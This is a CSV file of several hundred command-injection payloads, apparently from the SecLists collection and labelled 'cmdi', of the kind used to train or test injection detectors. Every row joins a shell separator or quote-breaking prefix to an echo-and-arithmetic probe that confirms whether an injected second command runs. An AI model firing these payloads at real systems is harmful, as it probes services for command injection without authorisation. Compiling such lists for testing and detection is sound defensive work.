payload,label,source
'|echo%20NINPLO$((85%2B22))$(echo%20NINPLO)NINPLO%2F%2F,cmdi,seclists
'||echo%20UAPCZM$((19%2B50))$(echo%20UAPCZM)UAPCZM%2F%2F,cmdi,seclists
'&&echo%20JGTGES$((48%2B34))$(echo%20JGTGES)JGTGES%2F%2F,cmdi,seclists
'%0aecho%20QVUNCP$((53%2B11))$(echo%20QVUNCP)QVUNCP%2F%2F,cmdi,seclists
'%3Becho%20GHQCJV$((24%2B65))$(echo%20GHQCJV)GHQCJV%2F%2F,cmdi,seclists
'%26echo%20ZXUJMM$((66%2B53))$(echo%20ZXUJMM)ZXUJMM%2F%2F,cmdi,seclists
'%26%26echo%20UWWBJC$((28%2B91))$(echo%20UWWBJC)UWWBJC%2F%2F,cmdi,seclists
'%7Cecho%20ZGANEQ$((95%2B91))$(echo%20ZGANEQ)ZGANEQ%2F%2F,cmdi,seclists
'%7C%7Cecho%20WVNPRW$((44%2B23))$(echo%20WVNPRW)WVNPRW%2F%2F,cmdi,seclists
'echo%20ZQODFO$((38%2B30))$(echo%20ZQODFO)ZQODFO%26,cmdi,seclists
'%20echo%20VBRTZG$((57%2B99))$(echo%20VBRTZG)VBRTZG%26,cmdi,seclists
';echo%20EDEYQK$((45%2B89))$(echo%20EDEYQK)EDEYQK%26,cmdi,seclists
'&echo%20HUEWVL$((15%2B9))$(echo%20HUEWVL)HUEWVL%26,cmdi,seclists
'|echo%20FWJJDN$((64%2B27))$(echo%20FWJJDN)FWJJDN%26,cmdi,seclists
'||echo%20DJIUPG$((86%2B80))$(echo%20DJIUPG)DJIUPG%26,cmdi,seclists
'&&echo%20LQMLDZ$((74%2B43))$(echo%20LQMLDZ)LQMLDZ%26,cmdi,seclists
'%0aecho%20VECHDM$((44%2B40))$(echo%20VECHDM)VECHDM%26,cmdi,seclists
'%3Becho%20ZPQVVV$((58%2B25))$(echo%20ZPQVVV)ZPQVVV%26,cmdi,seclists
'%26echo%20IECZZA$((76%2B1))$(echo%20IECZZA)IECZZA%26,cmdi,seclists
'%26%26echo%20WRWTAS$((61%2B67))$(echo%20WRWTAS)WRWTAS%26,cmdi,seclists
'%7Cecho%20VBTZIY$((45%2B53))$(echo%20VBTZIY)VBTZIY%26,cmdi,seclists
'%7C%7Cecho%20QOWWZU$((31%2B94))$(echo%20QOWWZU)QOWWZU%26,cmdi,seclists
'echo%20NIXAXB$((47%2B23))$(echo%20NIXAXB)NIXAXB%7C,cmdi,seclists
'%20echo%20MIVIHV$((7%2B58))$(echo%20MIVIHV)MIVIHV%7C,cmdi,seclists
';echo%20CYLOAT$((50%2B30))$(echo%20CYLOAT)CYLOAT%7C,cmdi,seclists
'&echo%20WHTJDF$((87%2B5))$(echo%20WHTJDF)WHTJDF%7C,cmdi,seclists
'|echo%20DTSQRM$((82%2B33))$(echo%20DTSQRM)DTSQRM%7C,cmdi,seclists
'||echo%20SPFQXR$((54%2B70))$(echo%20SPFQXR)SPFQXR%7C,cmdi,seclists
'&&echo%20TQZUUM$((43%2B5))$(echo%20TQZUUM)TQZUUM%7C,cmdi,seclists
'%0aecho%20LRJXVV$((74%2B11))$(echo%20LRJXVV)LRJXVV%7C,cmdi,seclists
'%3Becho%20QGYQUP$((35%2B73))$(echo%20QGYQUP)QGYQUP%7C,cmdi,seclists
'%26echo%20SYNXTK$((0%2B99))$(echo%20SYNXTK)SYNXTK%7C,cmdi,seclists
'%26%26echo%20MIQKPQ$((80%2B18))$(echo%20MIQKPQ)MIQKPQ%7C,cmdi,seclists
'%7Cecho%20HKFPKH$((65%2B16))$(echo%20HKFPKH)HKFPKH%7C,cmdi,seclists
'%7C%7Cecho%20FUFIPG$((27%2B62))$(echo%20FUFIPG)FUFIPG%7C,cmdi,seclists
"""echo%20UFAGYK$((82%2B39))$(echo%20UFAGYK)UFAGYK",cmdi,seclists
"""%20echo%20IXTSZA$((19%2B14))$(echo%20IXTSZA)IXTSZA",cmdi,seclists
""";echo%20BJMUOS$((51%2B32))$(echo%20BJMUOS)BJMUOS",cmdi,seclists
"""&echo%20CYVXHL$((2%2B25))$(echo%20CYVXHL)CYVXHL",cmdi,seclists
"""|echo%20JFFFCK$((98%2B39))$(echo%20JFFFCK)JFFFCK",cmdi,seclists
"""||echo%20JZKWAX$((82%2B62))$(echo%20JZKWAX)JZKWAX",cmdi,seclists
"""&&echo%20PFNZYT$((53%2B30))$(echo%20PFNZYT)PFNZYT",cmdi,seclists
"""%0aecho%20CJDAVC$((37%2B56))$(echo%20CJDAVC)CJDAVC",cmdi,seclists
"""%3Becho%20XKMIXJ$((55%2B55))$(echo%20XKMIXJ)XKMIXJ",cmdi,seclists
"""%26echo%20XPABSL$((91%2B48))$(echo%20XPABSL)XPABSL",cmdi,seclists
"""%26%26echo%20MSODXX$((98%2B77))$(echo%20MSODXX)MSODXX",cmdi,seclists
"""%7Cecho%20NIUSSD$((14%2B80))$(echo%20NIUSSD)NIUSSD",cmdi,seclists
"""%7C%7Cecho%20ZXHQBT$((34%2B29))$(echo%20ZXHQBT)ZXHQBT",cmdi,seclists
"""echo%20LROQVJ$((59%2B51))$(echo%20LROQVJ)LROQVJ'",cmdi,seclists
"""%20echo%20AWPUDF$((45%2B83))$(echo%20AWPUDF)AWPUDF'",cmdi,seclists
""";echo%20DHCQNM$((60%2B94))$(echo%20DHCQNM)DHCQNM'",cmdi,seclists
"""&echo%20AMSBLU$((47%2B94))$(echo%20AMSBLU)AMSBLU'",cmdi,seclists
"""|echo%20DKGJRP$((17%2B97))$(echo%20DKGJRP)DKGJRP'",cmdi,seclists
"""||echo%20TABSEM$((52%2B6))$(echo%20TABSEM)TABSEM'",cmdi,seclists
"""&&echo%20YPKEUZ$((26%2B62))$(echo%20YPKEUZ)YPKEUZ'",cmdi,seclists
"""%0aecho%20UIFJEM$((39%2B5))$(echo%20UIFJEM)UIFJEM'",cmdi,seclists
"""%3Becho%20RBDSUF$((59%2B65))$(echo%20RBDSUF)RBDSUF'",cmdi,seclists
"""%26echo%20HKWALZ$((5%2B31))$(echo%20HKWALZ)HKWALZ'",cmdi,seclists
"""%26%26echo%20XHYRUC$((45%2B24))$(echo%20XHYRUC)XHYRUC'",cmdi,seclists
"""%7Cecho%20JZTYDR$((14%2B40))$(echo%20JZTYDR)JZTYDR'",cmdi,seclists
"""%7C%7Cecho%20BOMIAP$((85%2B40))$(echo%20BOMIAP)BOMIAP'",cmdi,seclists
"""echo%20UEUAGM$((11%2B22))$(echo%20UEUAGM)UEUAGM""",cmdi,seclists
"""%20echo%20IWYYYV$((59%2B47))$(echo%20IWYYYV)IWYYYV""",cmdi,seclists
""";echo%20NUURLG$((10%2B93))$(echo%20NUURLG)NUURLG""",cmdi,seclists
"""&echo%20DTXNAY$((11%2B40))$(echo%20DTXNAY)DTXNAY""",cmdi,seclists
"""|echo%20UPRLNQ$((23%2B4))$(echo%20UPRLNQ)UPRLNQ""",cmdi,seclists
"""||echo%20VKPFAP$((92%2B94))$(echo%20VKPFAP)VKPFAP""",cmdi,seclists
"""&&echo%20KWPRCS$((3%2B21))$(echo%20KWPRCS)KWPRCS""",cmdi,seclists
"""%0aecho%20MJVQYB$((44%2B28))$(echo%20MJVQYB)MJVQYB""",cmdi,seclists
"""%3Becho%20TMWMCT$((51%2B35))$(echo%20TMWMCT)TMWMCT""",cmdi,seclists
"""%26echo%20HCCVWB$((30%2B94))$(echo%20HCCVWB)HCCVWB""",cmdi,seclists
"""%26%26echo%20GEOQBM$((28%2B12))$(echo%20GEOQBM)GEOQBM""",cmdi,seclists
"""%7Cecho%20FCZDSM$((68%2B91))$(echo%20FCZDSM)FCZDSM""",cmdi,seclists
"""%7C%7Cecho%20HTPEMJ$((2%2B19))$(echo%20HTPEMJ)HTPEMJ""",cmdi,seclists
"""echo%20OQTVEH$((73%2B9))$(echo%20OQTVEH)OQTVEH",cmdi,seclists
"""%20echo%20QIOHVO$((71%2B18))$(echo%20QIOHVO)QIOHVO",cmdi,seclists
""";echo%20HIENCF$((0%2B66))$(echo%20HIENCF)HIENCF",cmdi,seclists
"""&echo%20IBIYQC$((4%2B38))$(echo%20IBIYQC)IBIYQC",cmdi,seclists
"""|echo%20FOBRPZ$((91%2B99))$(echo%20FOBRPZ)FOBRPZ",cmdi,seclists
"""||echo%20KVIAFY$((17%2B57))$(echo%20KVIAFY)KVIAFY",cmdi,seclists
"""&&echo%20IQZTQY$((96%2B36))$(echo%20IQZTQY)IQZTQY",cmdi,seclists
"""%0aecho%20PNFTTQ$((20%2B65))$(echo%20PNFTTQ)PNFTTQ",cmdi,seclists
"""%3Becho%20PDMNTI$((23%2B51))$(echo%20PDMNTI)PDMNTI",cmdi,seclists
"""%26echo%20QKCGPP$((73%2B25))$(echo%20QKCGPP)QKCGPP",cmdi,seclists
"""%26%26echo%20IJQIDW$((5%2B53))$(echo%20IJQIDW)IJQIDW",cmdi,seclists
"""%7Cecho%20ZIYCEF$((9%2B56))$(echo%20ZIYCEF)ZIYCEF",cmdi,seclists
"""%7C%7Cecho%20OMOFYD$((86%2B53))$(echo%20OMOFYD)OMOFYD",cmdi,seclists
"""echo%20SRQCVS$((48%2B38))$(echo%20SRQCVS)SRQCVS//",cmdi,seclists
"""%20echo%20BYNNOQ$((5%2B9))$(echo%20BYNNOQ)BYNNOQ//",cmdi,seclists
""";echo%20OFZRPB$((30%2B95))$(echo%20OFZRPB)OFZRPB//",cmdi,seclists
"""&echo%20QZCVQA$((19%2B81))$(echo%20QZCVQA)QZCVQA//",cmdi,seclists
"""|echo%20XLPJUH$((63%2B35))$(echo%20XLPJUH)XLPJUH//",cmdi,seclists
"""||echo%20GIRCRN$((15%2B16))$(echo%20GIRCRN)GIRCRN//",cmdi,seclists
"""&&echo%20KXEBPS$((55%2B92))$(echo%20KXEBPS)KXEBPS//",cmdi,seclists
"""%0aecho%20JCEFAY$((97%2B37))$(echo%20JCEFAY)JCEFAY//",cmdi,seclists
"""%3Becho%20MDSQTA$((24%2B10))$(echo%20MDSQTA)MDSQTA//",cmdi,seclists
"""%26echo%20AIKVYL$((27%2B44))$(echo%20AIKVYL)AIKVYL//",cmdi,seclists
"""%26%26echo%20YUQTKP$((71%2B23))$(echo%20YUQTKP)YUQTKP//",cmdi,seclists
"""%7Cecho%20GPGSXE$((20%2B85))$(echo%20GPGSXE)GPGSXE//",cmdi,seclists
"""%7C%7Cecho%20JDTYJX$((18%2B24))$(echo%20JDTYJX)JDTYJX//",cmdi,seclists
"""echo%20UWNJQE$((91%2B46))$(echo%20UWNJQE)UWNJQE\",cmdi,seclists
"""%20echo%20TZZNSL$((92%2B66))$(echo%20TZZNSL)TZZNSL\",cmdi,seclists
""";echo%20IJTGYU$((36%2B47))$(echo%20IJTGYU)IJTGYU\",cmdi,seclists
"""&echo%20TRMPTD$((48%2B23))$(echo%20TRMPTD)TRMPTD\",cmdi,seclists
"""|echo%20EEOGHF$((87%2B30))$(echo%20EEOGHF)EEOGHF\",cmdi,seclists
"""||echo%20EXJSNR$((49%2B13))$(echo%20EXJSNR)EXJSNR\",cmdi,seclists
"""&&echo%20PMIRHD$((95%2B94))$(echo%20PMIRHD)PMIRHD\",cmdi,seclists
"""%0aecho%20PZDPMF$((67%2B92))$(echo%20PZDPMF)PZDPMF\",cmdi,seclists
"""%3Becho%20OFKRSW$((4%2B25))$(echo%20OFKRSW)OFKRSW\",cmdi,seclists
"""%26echo%20MBGKIN$((22%2B60))$(echo%20MBGKIN)MBGKIN\",cmdi,seclists
"""%26%26echo%20FGFIOR$((55%2B25))$(echo%20FGFIOR)FGFIOR\",cmdi,seclists
"""%7Cecho%20XTLLDX$((25%2B20))$(echo%20XTLLDX)XTLLDX\",cmdi,seclists
"""%7C%7Cecho%20HKHVFC$((85%2B7))$(echo%20HKHVFC)HKHVFC\",cmdi,seclists
"""echo%20TPIIXD$((67%2B79))$(echo%20TPIIXD)TPIIXD&",cmdi,seclists
"""%20echo%20FEKBSB$((80%2B66))$(echo%20FEKBSB)FEKBSB&",cmdi,seclists
""";echo%20DNJXZB$((38%2B82))$(echo%20DNJXZB)DNJXZB&",cmdi,seclists
"""&echo%20JNXUVW$((81%2B20))$(echo%20JNXUVW)JNXUVW&",cmdi,seclists
"""|echo%20BKRUJQ$((5%2B96))$(echo%20BKRUJQ)BKRUJQ&",cmdi,seclists
"""||echo%20TNFYTM$((72%2B96))$(echo%20TNFYTM)TNFYTM&",cmdi,seclists
"""&&echo%20AEAXJF$((73%2B78))$(echo%20AEAXJF)AEAXJF&",cmdi,seclists
"""%0aecho%20DDWDPN$((91%2B29))$(echo%20DDWDPN)DDWDPN&",cmdi,seclists
"""%3Becho%20UZGZPC$((74%2B69))$(echo%20UZGZPC)UZGZPC&",cmdi,seclists
"""%26echo%20CXIGLR$((26%2B78))$(echo%20CXIGLR)CXIGLR&",cmdi,seclists
"""%26%26echo%20EXRBWP$((2%2B65))$(echo%20EXRBWP)EXRBWP&",cmdi,seclists
"""%7Cecho%20ZOFKJO$((5%2B82))$(echo%20ZOFKJO)ZOFKJO&",cmdi,seclists
"""%7C%7Cecho%20CTTIVX$((65%2B14))$(echo%20CTTIVX)CTTIVX&",cmdi,seclists
"""echo%20NMPYVC$((95%2B49))$(echo%20NMPYVC)NMPYVC|",cmdi,seclists
"""%20echo%20CTFTCJ$((80%2B91))$(echo%20CTFTCJ)CTFTCJ|",cmdi,seclists
""";echo%20QBISFH$((85%2B18))$(echo%20QBISFH)QBISFH|",cmdi,seclists
"""&echo%20CCWSNS$((52%2B72))$(echo%20CCWSNS)CCWSNS|",cmdi,seclists
"""|echo%20IIWZTV$((37%2B92))$(echo%20IIWZTV)IIWZTV|",cmdi,seclists
"""||echo%20DKOIIU$((52%2B39))$(echo%20DKOIIU)DKOIIU|",cmdi,seclists
"""&&echo%20ELGGDQ$((2%2B5))$(echo%20ELGGDQ)ELGGDQ|",cmdi,seclists
"""%0aecho%20QBFOYY$((28%2B31))$(echo%20QBFOYY)QBFOYY|",cmdi,seclists
"""%3Becho%20QATQCM$((57%2B7))$(echo%20QATQCM)QATQCM|",cmdi,seclists
"""%26echo%20XKUYPF$((60%2B61))$(echo%20XKUYPF)XKUYPF|",cmdi,seclists
"""%26%26echo%20DBNQDD$((96%2B50))$(echo%20DBNQDD)DBNQDD|",cmdi,seclists
"""%7Cecho%20BAERUM$((15%2B78))$(echo%20BAERUM)BAERUM|",cmdi,seclists
"""%7C%7Cecho%20FFARMZ$((95%2B61))$(echo%20FFARMZ)FFARMZ|",cmdi,seclists
"""echo%20MJEJVE$((54%2B9))$(echo%20MJEJVE)MJEJVE%27",cmdi,seclists
"""%20echo%20LRNMXI$((82%2B72))$(echo%20LRNMXI)LRNMXI%27",cmdi,seclists
""";echo%20QNIOIG$((45%2B76))$(echo%20QNIOIG)QNIOIG%27",cmdi,seclists
"""&echo%20TFMDGN$((33%2B82))$(echo%20TFMDGN)TFMDGN%27",cmdi,seclists
"""|echo%20CCTRQP$((48%2B16))$(echo%20CCTRQP)CCTRQP%27",cmdi,seclists
"""||echo%20SAHVEF$((53%2B99))$(echo%20SAHVEF)SAHVEF%27",cmdi,seclists
"""&&echo%20SKQWDW$((71%2B38))$(echo%20SKQWDW)SKQWDW%27",cmdi,seclists
"""%0aecho%20LFVTXU$((70%2B65))$(echo%20LFVTXU)LFVTXU%27",cmdi,seclists
"""%3Becho%20KRGULU$((96%2B71))$(echo%20KRGULU)KRGULU%27",cmdi,seclists
"""%26echo%20WHBQCR$((5%2B15))$(echo%20WHBQCR)WHBQCR%27",cmdi,seclists
"""%26%26echo%20NUMBRK$((29%2B87))$(echo%20NUMBRK)NUMBRK%27",cmdi,seclists
"""%7Cecho%20NGISBI$((50%2B27))$(echo%20NGISBI)NGISBI%27",cmdi,seclists
"""%7C%7Cecho%20OESDWI$((60%2B61))$(echo%20OESDWI)OESDWI%27",cmdi,seclists
"""echo%20XFGDCC$((53%2B64))$(echo%20XFGDCC)XFGDCC%22",cmdi,seclists
"""%20echo%20BZQFLS$((30%2B41))$(echo%20BZQFLS)BZQFLS%22",cmdi,seclists
""";echo%20KGVZYK$((88%2B50))$(echo%20KGVZYK)KGVZYK%22",cmdi,seclists
"""&echo%20ILAWBP$((7%2B21))$(echo%20ILAWBP)ILAWBP%22",cmdi,seclists
"""|echo%20LYYMLJ$((68%2B90))$(echo%20LYYMLJ)LYYMLJ%22",cmdi,seclists
"""||echo%20RJZLGG$((1%2B14))$(echo%20RJZLGG)RJZLGG%22",cmdi,seclists
"""&&echo%20IWMDND$((49%2B2))$(echo%20IWMDND)IWMDND%22",cmdi,seclists
"""%0aecho%20ZRDUWP$((33%2B75))$(echo%20ZRDUWP)ZRDUWP%22",cmdi,seclists
"""%3Becho%20MMYKAT$((11%2B87))$(echo%20MMYKAT)MMYKAT%22",cmdi,seclists
"""%26echo%20YWVNNT$((69%2B85))$(echo%20YWVNNT)YWVNNT%22",cmdi,seclists
"""%26%26echo%20HNBMVY$((5%2B65))$(echo%20HNBMVY)HNBMVY%22",cmdi,seclists
"""%7Cecho%20WYANEK$((66%2B6))$(echo%20WYANEK)WYANEK%22",cmdi,seclists
"""%7C%7Cecho%20NVZIAZ$((98%2B45))$(echo%20NVZIAZ)NVZIAZ%22",cmdi,seclists
"""echo%20VTSNKY$((47%2B67))$(echo%20VTSNKY)VTSNKY%5C%5C",cmdi,seclists
"""%20echo%20KTLVZA$((31%2B12))$(echo%20KTLVZA)KTLVZA%5C%5C",cmdi,seclists
""";echo%20LWIARI$((77%2B11))$(echo%20LWIARI)LWIARI%5C%5C",cmdi,seclists
"""&echo%20YMCHJB$((38%2B99))$(echo%20YMCHJB)YMCHJB%5C%5C",cmdi,seclists
"""|echo%20DDRLVR$((41%2B36))$(echo%20DDRLVR)DDRLVR%5C%5C",cmdi,seclists
"""||echo%20OMAHVH$((14%2B99))$(echo%20OMAHVH)OMAHVH%5C%5C",cmdi,seclists
"""&&echo%20PISJQQ$((33%2B72))$(echo%20PISJQQ)PISJQQ%5C%5C",cmdi,seclists
"""%0aecho%20SUQJYA$((1%2B59))$(echo%20SUQJYA)SUQJYA%5C%5C",cmdi,seclists
"""%3Becho%20WADYUK$((6%2B43))$(echo%20WADYUK)WADYUK%5C%5C",cmdi,seclists
"""%26echo%20TGSMRI$((56%2B34))$(echo%20TGSMRI)TGSMRI%5C%5C",cmdi,seclists
"""%26%26echo%20FFNJFE$((44%2B38))$(echo%20FFNJFE)FFNJFE%5C%5C",cmdi,seclists
"""%7Cecho%20QAFEAV$((75%2B66))$(echo%20QAFEAV)QAFEAV%5C%5C",cmdi,seclists
"""%7C%7Cecho%20PHPVAS$((47%2B19))$(echo%20PHPVAS)PHPVAS%5C%5C",cmdi,seclists
"""echo%20EPDILQ$((5%2B61))$(echo%20EPDILQ)EPDILQ%2F%2F",cmdi,seclists
"""%20echo%20KGLFRE$((0%2B31))$(echo%20KGLFRE)KGLFRE%2F%2F",cmdi,seclists
""";echo%20EXOUDI$((91%2B14))$(echo%20EXOUDI)EXOUDI%2F%2F",cmdi,seclists
"""&echo%20MTBNOE$((46%2B26))$(echo%20MTBNOE)MTBNOE%2F%2F",cmdi,seclists
"""|echo%20CPTRGO$((21%2B79))$(echo%20CPTRGO)CPTRGO%2F%2F",cmdi,seclists
"""||echo%20QDYNED$((79%2B86))$(echo%20QDYNED)QDYNED%2F%2F",cmdi,seclists
"""&&echo%20NMVRBB$((60%2B26))$(echo%20NMVRBB)NMVRBB%2F%2F",cmdi,seclists
"""%0aecho%20BGHKOM$((19%2B31))$(echo%20BGHKOM)BGHKOM%2F%2F",cmdi,seclists
"""%3Becho%20NQDGAY$((73%2B33))$(echo%20NQDGAY)NQDGAY%2F%2F",cmdi,seclists
"""%26echo%20QSDXQR$((21%2B3))$(echo%20QSDXQR)QSDXQR%2F%2F",cmdi,seclists
"""%26%26echo%20KAOPJJ$((97%2B96))$(echo%20KAOPJJ)KAOPJJ%2F%2F",cmdi,seclists
"""%7Cecho%20FXXYAL$((38%2B83))$(echo%20FXXYAL)FXXYAL%2F%2F",cmdi,seclists
"""%7C%7Cecho%20UBEZEA$((22%2B25))$(echo%20UBEZEA)UBEZEA%2F%2F",cmdi,seclists
"""echo%20WXRSMM$((62%2B81))$(echo%20WXRSMM)WXRSMM%26",cmdi,seclists
"""%20echo%20OQFTMT$((91%2B48))$(echo%20OQFTMT)OQFTMT%26",cmdi,seclists
""";echo%20KLODWM$((81%2B43))$(echo%20KLODWM)KLODWM%26",cmdi,seclists
"""&echo%20LHBNPU$((26%2B5))$(echo%20LHBNPU)LHBNPU%26",cmdi,seclists
"""|echo%20GLNWTR$((75%2B96))$(echo%20GLNWTR)GLNWTR%26",cmdi,seclists
"""||echo%20GRZSSH$((83%2B88))$(echo%20GRZSSH)GRZSSH%26",cmdi,seclists
"""&&echo%20FLLKBG$((76%2B53))$(echo%20FLLKBG)FLLKBG%26",cmdi,seclists
"""%0aecho%20QBALEF$((39%2B26))$(echo%20QBALEF)QBALEF%26",cmdi,seclists
"""%3Becho%20WVYDHU$((64%2B10))$(echo%20WVYDHU)WVYDHU%26",cmdi,seclists
"""%26echo%20YKYSMI$((14%2B15))$(echo%20YKYSMI)YKYSMI%26",cmdi,seclists
"""%26%26echo%20TZMDSB$((68%2B98))$(echo%20TZMDSB)TZMDSB%26",cmdi,seclists
"""%7Cecho%20JUMRWV$((18%2B92))$(echo%20JUMRWV)JUMRWV%26",cmdi,seclists
"""%7C%7Cecho%20NLZITW$((11%2B41))$(echo%20NLZITW)NLZITW%26",cmdi,seclists
"""echo%20BNHMPM$((4%2B77))$(echo%20BNHMPM)BNHMPM%7C",cmdi,seclists
"""%20echo%20TZKEKG$((48%2B96))$(echo%20TZKEKG)TZKEKG%7C",cmdi,seclists
""";echo%20IBQUEF$((98%2B95))$(echo%20IBQUEF)IBQUEF%7C",cmdi,seclists
"""&echo%20EHEGZM$((64%2B33))$(echo%20EHEGZM)EHEGZM%7C",cmdi,seclists
"""|echo%20XTNGGL$((91%2B22))$(echo%20XTNGGL)XTNGGL%7C",cmdi,seclists
"""||echo%20OHBDBS$((38%2B62))$(echo%20OHBDBS)OHBDBS%7C",cmdi,seclists
"""&&echo%20IOUKTY$((23%2B26))$(echo%20IOUKTY)IOUKTY%7C",cmdi,seclists
"""%0aecho%20JLXCCQ$((76%2B40))$(echo%20JLXCCQ)JLXCCQ%7C",cmdi,seclists
"""%3Becho%20WRYICW$((92%2B9))$(echo%20WRYICW)WRYICW%7C",cmdi,seclists
"""%26echo%20LNTOCN$((59%2B67))$(echo%20LNTOCN)LNTOCN%7C",cmdi,seclists
"""%26%26echo%20WSLHMV$((15%2B92))$(echo%20WSLHMV)WSLHMV%7C",cmdi,seclists
"""%7Cecho%20ICAVIW$((19%2B96))$(echo%20ICAVIW)ICAVIW%7C",cmdi,seclists
"""%7C%7Cecho%20TSQXVM$((77%2B52))$(echo%20TSQXVM)TSQXVM%7C",cmdi,seclists
;echo%20ESBMYC$((3%2B57))$(echo%20ESBMYC)ESBMYC,cmdi,seclists
&echo%20DPXLYV$((75%2B2))$(echo%20DPXLYV)DPXLYV,cmdi,seclists
&&echo%20WMETWL$((1%2B53))$(echo%20WMETWL)WMETWL,cmdi,seclists
%0aecho%20VFMAJZ$((49%2B82))$(echo%20VFMAJZ)VFMAJZ,cmdi,seclists
%3Becho%20EFMVRM$((22%2B51))$(echo%20EFMVRM)EFMVRM,cmdi,seclists
%26echo%20CFQNOE$((61%2B46))$(echo%20CFQNOE)CFQNOE,cmdi,seclists
%26%26echo%20DTVUWP$((97%2B67))$(echo%20DTVUWP)DTVUWP,cmdi,seclists
%7Cecho%20NIEMKE$((13%2B11))$(echo%20NIEMKE)NIEMKE,cmdi,seclists
%7C%7Cecho%20KTTKHD$((67%2B44))$(echo%20KTTKHD)KTTKHD,cmdi,seclists
echo%20KBEMAI$((13%2B27))$(echo%20KBEMAI)KBEMAI',cmdi,seclists
%20echo%20PQVHOY$((31%2B46))$(echo%20PQVHOY)PQVHOY',cmdi,seclists
;echo%20CUJAIZ$((32%2B35))$(echo%20CUJAIZ)CUJAIZ',cmdi,seclists
&echo%20PLNWCY$((48%2B70))$(echo%20PLNWCY)PLNWCY',cmdi,seclists
&&echo%20ZVYTEU$((90%2B87))$(echo%20ZVYTEU)ZVYTEU',cmdi,seclists
%0aecho%20RWVTYR$((38%2B86))$(echo%20RWVTYR)RWVTYR',cmdi,seclists
%3Becho%20PDWIBS$((76%2B7))$(echo%20PDWIBS)PDWIBS',cmdi,seclists
%26echo%20VDRXRP$((8%2B96))$(echo%20VDRXRP)VDRXRP',cmdi,seclists
%26%26echo%20KOBQCV$((27%2B2))$(echo%20KOBQCV)KOBQCV',cmdi,seclists
%7Cecho%20UZKGGW$((60%2B30))$(echo%20UZKGGW)UZKGGW',cmdi,seclists
%7C%7Cecho%20HVEVCZ$((20%2B29))$(echo%20HVEVCZ)HVEVCZ',cmdi,seclists
"echo%20NRCXSS$((87%2B18))$(echo%20NRCXSS)NRCXSS""",cmdi,seclists
"%20echo%20RPDFEQ$((68%2B74))$(echo%20RPDFEQ)RPDFEQ""",cmdi,seclists
";echo%20VFFQVI$((85%2B47))$(echo%20VFFQVI)VFFQVI""",cmdi,seclists
"&echo%20CUKTGK$((2%2B61))$(echo%20CUKTGK)CUKTGK""",cmdi,seclists
"&&echo%20ARDPUW$((94%2B28))$(echo%20ARDPUW)ARDPUW""",cmdi,seclists
"%0aecho%20UNXWMT$((40%2B95))$(echo%20UNXWMT)UNXWMT""",cmdi,seclists
"%3Becho%20NAPRQZ$((30%2B63))$(echo%20NAPRQZ)NAPRQZ""",cmdi,seclists
"%26echo%20UCMRWH$((43%2B12))$(echo%20UCMRWH)UCMRWH""",cmdi,seclists
"%26%26echo%20WXDFTC$((82%2B43))$(echo%20WXDFTC)WXDFTC""",cmdi,seclists
"%7Cecho%20WEFNXM$((36%2B97))$(echo%20WEFNXM)WEFNXM""",cmdi,seclists
"%7C%7Cecho%20FCVZMK$((81%2B22))$(echo%20FCVZMK)FCVZMK""",cmdi,seclists
echo%20OQDPSL$((47%2B24))$(echo%20OQDPSL)OQDPSL,cmdi,seclists
%20echo%20SILUZP$((90%2B7))$(echo%20SILUZP)SILUZP,cmdi,seclists
;echo%20ROYDKA$((65%2B12))$(echo%20ROYDKA)ROYDKA,cmdi,seclists
&echo%20FGFXYB$((41%2B62))$(echo%20FGFXYB)FGFXYB,cmdi,seclists
&&echo%20TQHCUN$((6%2B71))$(echo%20TQHCUN)TQHCUN,cmdi,seclists
%0aecho%20LLPOAO$((93%2B93))$(echo%20LLPOAO)LLPOAO,cmdi,seclists
%3Becho%20QPNMNQ$((33%2B62))$(echo%20QPNMNQ)QPNMNQ,cmdi,seclists
%26echo%20BCONMT$((21%2B78))$(echo%20BCONMT)BCONMT,cmdi,seclists
%26%26echo%20HRLRGU$((89%2B5))$(echo%20HRLRGU)HRLRGU,cmdi,seclists
%7Cecho%20MSOAVP$((20%2B27))$(echo%20MSOAVP)MSOAVP,cmdi,seclists
%7C%7Cecho%20NYSCWX$((31%2B90))$(echo%20NYSCWX)NYSCWX,cmdi,seclists
echo%20GCITOP$((61%2B30))$(echo%20GCITOP)GCITOP//,cmdi,seclists
%20echo%20FKCLCN$((17%2B95))$(echo%20FKCLCN)FKCLCN//,cmdi,seclists
;echo%20RAOGCR$((98%2B45))$(echo%20RAOGCR)RAOGCR//,cmdi,seclists
&echo%20NLPFSA$((24%2B13))$(echo%20NLPFSA)NLPFSA//,cmdi,seclists
&&echo%20NCEXJG$((72%2B12))$(echo%20NCEXJG)NCEXJG//,cmdi,seclists
%0aecho%20XSPTNK$((94%2B10))$(echo%20XSPTNK)XSPTNK//,cmdi,seclists
